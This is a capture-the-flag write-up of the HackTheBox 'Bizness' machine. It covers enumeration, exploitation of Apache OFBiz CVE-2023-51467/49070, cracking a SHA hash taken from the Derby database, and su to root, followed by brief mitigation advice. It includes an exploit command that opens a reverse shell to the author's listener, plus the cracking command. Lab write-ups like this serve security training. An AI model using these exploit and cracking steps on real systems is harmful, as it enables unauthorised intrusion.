---
title: "HackTheBox - Bizness"
author: Nasrallah
description: ""
date: 2024-05-25 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, crack, rce, cve]
img_path: /assets/img/hackthebox/machines/bizness
image:
    path: bizness.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Bizness](https://www.hackthebox.com/machines/bizness) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) is running a version of Apache Ofbiz vulnerable to Authentication bypass and remote code execution giving us a foothold on the server. After that we find a hash that we crack and get a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.252
Host is up (0.38s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports, 22 running SSH, 80 is nginx web server redirecting to to the host `bizness.htb` on port 443. Let's add it to `/etc/hosts` file.

### Web

Let's navigate to the web page.

![webpage](1.png)

The website seems to be static, all the links refers to section on the web page.

Scrolling down all the way to the bottom we find some interesting info.

![ofbiz](2.png)

The website uses `Apache Ofbiz`.

Searching on google for `Ofbiz exploit` reveals the two CVEs `CVE-2023-51467` and `CVE-2023-49070` allowing for an authentication bypass and remote code execution.

The exploit I'll be using can be found here: <https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz?tab=readme-ov-file>.

## **Foothold**

First, we need download `ysoserial-all.jar` file

```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```

Now we run the exploit.

```terminal
$ python3 ofbiz_exploit.py https://bizness.htb shell 10.10.16.18:9001
The target appears to be vulnerable.                                                                                                                                                                                                       
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Error while generating or serializing payload                                                                        
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x171b706d) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not ex
port com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x171b706d
        at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
        at ysoserial.payloads.CommonsBeanutils1.getObject(CommonsBeanutils1.java:20)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)

        Error. Try changing your current Java version to Java 11: 
sudo apt-get install openjdk-11-jdk
                                                                                                                     
sudo update-alternatives --config java
```

The exploit needs `openjdk-11-jdk` to run.

I listed the java version on my machine with `update-java-alternatives --list`

```bash
$ update-java-alternatives --list                                                                                  
java-1.11.0-openjdk-amd64      1111       /usr/lib/jvm/java-1.11.0-openjdk-amd64
java-1.17.0-openjdk-amd64      1711       /usr/lib/jvm/java-1.17.0-openjdk-amd64
```

I have the correct version I just need to change to it with the following command:

```bash
sudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64
```

Now we run the exploit.

![exploit](3.png)

I got the shell.

## **Privilege Escalation**

Apache Ofbiz uses a database called `derby`, so I greped for the word password in the `/opt/ofbiz/runtime/data/derby` directory with `grep -Ri 'password' ./`.

There was a lot of output but with the help of a friend I managed to locate the hash.

![crack](4.png)

To crack it we can use the following script: <https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker>

```bash
$ python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
[+] Attempting to crack....
Found Password: monkeybizness
hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
(Attempts: 1478438)
[!] Super, I bet you could log into something with that!
```

Using this password to switch to user `root`

```bash
ofbiz@bizness:~$ su root
Password: 
root@bizness:~#
```

## **Prevention and Mitigation**

### Ofbiz RCE

Pre-auth RCE in Apache Ofbiz 18.12.09. It’s due to XML-RPC no longer maintained still present. This issue affects Apache OFBiz: before 18.12.10. Users are recommended to upgrade to version 18.12.10

### Password

Passwords should always be long and complex using numbers, capital letters and special characters which would make cracking the hash way harder.

Also passwords should never be reused

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## References

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49070>

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51467>

<https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz?tab=readme-ov-file>

<https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker>
